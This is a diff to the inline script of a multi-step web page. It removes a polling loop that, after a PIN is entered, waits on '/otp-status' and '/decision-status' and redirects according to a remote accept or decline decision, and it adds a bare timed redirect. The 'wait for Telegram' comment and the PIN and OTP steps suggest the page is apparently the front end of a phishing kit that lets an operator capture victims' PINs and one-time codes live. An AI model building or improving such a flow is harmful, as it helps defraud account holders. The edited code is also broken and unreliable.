@@ -41,42 +41,12 @@ if (localStorage.getItem("firstProcess") === "yes") {
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
-  const interval = setInterval(async () => {
-    try {
-        const res = await fetch("/otp-status");
-        const data = await res.json();
-
-        console.log("OTP STATUS:", data);
-
-        // 🔥 FORCE CHECK (handles string + number)
-        if (data.otp == 5) {
+  
     localStorage.removeItem("fromPin");
-    clearInterval(interval);
+    setTimeout(() => {
     window.location.href = "step6.html";
 }
-
-        if (data.otp == 6) {
-    localStorage.removeItem("fromPin");
-    clearInterval(interval); // stop loop
-    window.location.href = "step6.html";
-}
-
-        const decisionRes = await fetch("/decision-status");
-        const decisionData = await decisionRes.json();
-
-        if (decisionData.decision === "accept") {
-            window.location.href = "dashboard.html";
-        }
-
-        if (decisionData.decision === "decline") {
-            localStorage.clear();
-            window.location.href = "step5.html";
-        }
-
-    } catch (err) {
-        console.log("Waiting...");
-    }
-}, 2000);  
+        2000);  
 
 }
 </script>
